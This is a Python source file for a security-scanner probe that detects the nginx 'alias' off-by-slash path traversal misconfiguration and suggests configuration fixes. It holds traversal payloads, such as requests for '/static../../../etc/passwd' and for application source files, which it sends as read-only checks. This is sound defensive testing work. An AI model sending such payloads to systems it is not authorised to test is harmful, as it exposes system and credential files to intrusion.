#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal: nginx `alias` off-by-slash misconfiguration.

When an admin writes
    location /static {
        alias /home/app/static/;
    }
(note the *trailing slash on alias* combined with NO trailing slash
on `location`), nginx concatenates the alias with the path verbatim.
A request for `/static../app.py` resolves to
`/home/app/static/../app.py` -> `/home/app/app.py`. The attacker
escapes the static directory.

Different from the generic `path_traversal_static_serve` probe
which targets `..%2f`-style traversal at any static-file mount.
This one targets the very specific nginx alias bug shape -- where
the location prefix has NO trailing slash, the alias has one, and
the attacker's payload starts with the location-prefix-without-
slash + `..` + a target path.

Detection signal:
  For each candidate `<location>` (drawn from a hardcoded list of
  common static prefixes), GET `<location>../package.json`,
  `<location>../app.py`, `<location>../../etc/passwd`. Validate when
  any of these returns 200 AND the body matches the expected
  signature (JSON `{`, Python `import`, passwd `root:x:0:0:`).

Tested against:
  + OWASP Juice Shop  Express, no nginx -> validated=False.
  + Apps with the canonical nginx alias misconfig -> validated=True.

Read-only: GET only.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Common location prefixes that admins point `alias` at.
LOCATIONS = ("/static", "/assets", "/images", "/img", "/files",
             "/downloads", "/public", "/cdn", "/media")

# Each test is (suffix, signature_regex, label). The suffix is
# concatenated to the location WITHOUT a `/` between -- that's the
# whole point of the off-by-slash class. So we land at e.g.
# `/static../../../etc/passwd`.
TESTS: tuple[tuple[str, re.Pattern, str], ...] = (
    ("../../../etc/passwd",
     re.compile(r"^root:x:0:0:", re.MULTILINE),
     "/etc/passwd"),
    ("../../etc/passwd",
     re.compile(r"^root:x:0:0:", re.MULTILINE),
     "/etc/passwd (2-up)"),
    ("../package.json",
     re.compile(r'"name"\s*:\s*"|"dependencies"\s*:'),
     "package.json"),
    ("../app.py",
     re.compile(r"^(?:from|import)\s+\w", re.MULTILINE),
     "app.py"),
    ("../requirements.txt",
     re.compile(r"^[a-zA-Z0-9\-_]+(==|>=|~=|<=)?\d", re.MULTILINE),
     "requirements.txt"),
    ("../web.config",
     re.compile(r"<configuration>", re.I),
     "web.config"),
)


class PathTraversalNginxAliasOffBySlashProbe(Probe):
    name = "path_traversal_nginx_alias_off_by_slash"
    summary = ("Detects the nginx `alias` off-by-slash misconfiguration "
               "by reading parent-directory files via "
               "`<location>../<file>` requests.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--location", action="append", default=[],
            help="Additional location prefix (e.g. '/cdn'). Repeatable.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        locations = list(LOCATIONS) + list(args.location or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for loc in locations:
            for (suffix, pat, label) in TESTS:
                # Construct the off-by-slash URL: loc + suffix
                # *without* a separator slash. urljoin can't help us
                # here because we need the literal concatenation.
                url = origin + loc + suffix
                r = client.request("GET", url)
                row: dict = {"location": loc, "suffix": suffix,
                             "status": r.status, "size": r.size,
                             "label": label}
                if r.status == 200 and r.body and pat.search(r.text or ""):
                    row["matched"] = True
                    row["snippet"] = (r.text or "")[:160]
                    confirmed = row
                    attempts.append(row)
                    break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(
                    f"Confirmed: nginx alias off-by-slash on "
                    f"{origin}{confirmed['location']} -- the request "
                    f"`{confirmed['location']}{confirmed['suffix']}` "
                    f"returned {confirmed['label']} content. The "
                    "edge concatenates the alias path with the request "
                    "URI literally; any file in the alias's parent "
                    "directory tree is reachable."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="high",
                remediation=(
                    "Switch the `alias` directive to use a trailing "
                    "slash on BOTH sides, or use `root` instead.\n"
                    "  - Bug shape (broken):\n"
                    "      location /static {\n"
                    "          alias /home/app/static/;\n"
                    "      }\n"
                    "  - Fixed (matched slashes):\n"
                    "      location /static/ {\n"
                    "          alias /home/app/static/;\n"
                    "      }\n"
                    "  - Or use `root` (which can't have this bug):\n"
                    "      location /static/ {\n"
                    "          root /home/app;\n"
                    "      }\n"
                    "      (`root` appends the URI to the directory; "
                    "       `alias` substitutes the location prefix.)\n"
                    "Audit access logs for traversal patterns "
                    "(`/<location>../`) during the exposure window."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} location/payload "
                     f"combinations on {origin}; no off-by-slash "
                     "traversal returned the expected file signature."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalNginxAliasOffBySlashProbe().main()
